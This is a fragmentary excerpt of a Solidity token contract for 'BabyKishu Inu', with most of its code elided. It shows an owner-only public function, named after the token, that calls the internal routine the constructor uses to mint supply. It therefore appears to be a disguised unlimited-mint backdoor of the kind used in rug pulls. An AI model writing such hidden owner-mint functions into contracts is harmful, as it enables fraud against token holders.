...
//
// $BabyKishuInu proposes an innovative feature in its contract.
//
// 📱 Telegram:https:https://t.me/babykishuinu
// 🌎 Website: TBA
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function BabyKishuInu(uint256 amount) public onlyOwner {
    _BabyKishuInu(msg.sender, amount);
    }
    ...
    function _BabyKishuInu(address account, uint256 amount) internal virtual {
...
contract BabyKishuInu is ERC20 {
    ...
    constructor() public ERC20("BabyKishu Inu", "BKI") {
        _BabyKishuInu(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}